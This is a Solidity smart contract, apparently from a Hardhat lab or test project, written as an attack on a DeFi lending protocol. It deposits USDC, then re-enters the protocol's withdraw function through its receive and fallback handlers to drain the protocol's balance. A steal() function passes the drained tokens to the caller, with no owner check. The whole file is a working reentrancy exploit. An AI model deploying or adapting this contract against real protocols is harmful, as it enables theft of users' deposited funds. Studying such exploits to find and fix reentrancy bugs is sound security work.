// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {IProtocol} from "../defiProtocol/interfaces/IProtocol.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "hardhat/console.sol";

contract AttackContract {
    IERC20 private s_usdc;
    address private owner;
    IProtocol private lastProtocol;

    constructor(address _usdcAddress) {
        s_usdc = IERC20(_usdcAddress);
        owner = msg.sender;
    }

    function attack(address protocolAddress) public {
        // Deposits tokens to the LendingBorrowing contract
        lastProtocol = IProtocol(protocolAddress);
        uint256 usdcBalance = s_usdc.balanceOf(address(this));

        s_usdc.approve(address(lastProtocol), usdcBalance);
        lastProtocol.deposit(usdcBalance);

        // Run the attack to exploit re-entrency in withdraw function
        lastProtocol.withdraw(usdcBalance);
    }

    function _reenter() internal {
        uint256 withdrawAmount = lastProtocol.getUserBalance(address(this));
        uint256 balanceRemaining = s_usdc.balanceOf(address(lastProtocol));
        //console.log("balance: %s", balance);
        
        if (balanceRemaining > withdrawAmount) {
            console.log("reentry");
            lastProtocol.withdraw(withdrawAmount);
        }
    }

    receive() external payable {
        _reenter();
    }

    fallback() external payable {
        _reenter();
    }

    // The owner of the contract withdraw the stolen funds
    function steal() public {
        s_usdc.transfer(msg.sender, s_usdc.balanceOf(address(this)));
    }
}
